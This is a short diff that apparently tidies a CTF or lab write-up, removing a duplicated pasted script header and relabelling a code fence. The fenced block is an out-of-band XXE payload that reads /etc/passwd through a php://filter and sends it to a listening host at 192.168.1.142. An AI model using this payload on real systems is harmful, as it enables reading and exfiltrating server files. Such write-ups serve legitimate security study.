@@ -291,14 +291,6 @@ import signal
 import sys
 import string
 import time
-❯ cat sqlidata.py
-#!/usr/bin/env python3
-
-import requests
-import signal
-import sys
-import string
-import time
 from pwn import *
 
 
@@ -427,7 +419,7 @@ python3 -m http.server 80
 
 ![](/img2/Pasted%20image%2020250323200745.png)
 
-```dtd
+```xml
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.142/?file=%file;'>">
 %eval;
